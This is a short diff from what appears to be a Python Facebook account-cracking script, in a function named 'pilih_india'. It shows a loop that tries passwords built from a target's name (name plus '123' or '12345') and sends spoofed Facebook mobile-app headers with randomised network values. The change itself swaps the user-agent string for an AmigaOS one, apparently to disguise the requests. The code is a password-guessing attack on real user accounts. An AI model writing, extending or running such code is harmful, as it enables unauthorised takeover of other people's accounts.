@@ -547,7 +547,7 @@ def pilih_india():
 			pass
 		try:
 			for pw in [name.lower()+'123',name.lower()+'12345']:
-				ua = random.choice(["Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6 Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36 Tapatalk/5.0.4"])
+				ua = random.choice(["Mozilla/5.0 (Amiga; U; AmigaOS 1.3; en; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14"])
 				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
 				'x-fb-net-hni': str(random.randint(20000, 40000)), 
 				'x-fb-connection-quality': 'EXCELLENT', 
